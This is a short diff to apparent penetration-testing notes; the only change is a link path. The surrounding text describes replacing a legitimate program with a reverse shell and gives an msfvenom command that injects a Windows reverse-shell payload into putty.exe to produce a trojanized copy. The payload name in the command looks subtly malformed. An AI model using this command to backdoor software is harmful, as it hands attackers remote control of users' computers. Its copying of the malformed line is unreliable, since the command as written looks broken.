@@ -1,5 +1,5 @@
 ### Executable Files
-- Legit binary can be replaced with reverse shell. [Msfvenom](../../Tools/Msfvenom.md) can inject payload into a legit binary.
+- Legit binary can be replaced with reverse shell. [Msfvenom](../../Cheatsheet/Msfvenom.md) can inject payload into a legit binary.
 ```bash
 msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/reverse_reverse_tcp LHOST=localhost LPORT=<port> -b "\x00" -f exe -o putty_x.exe
 ```
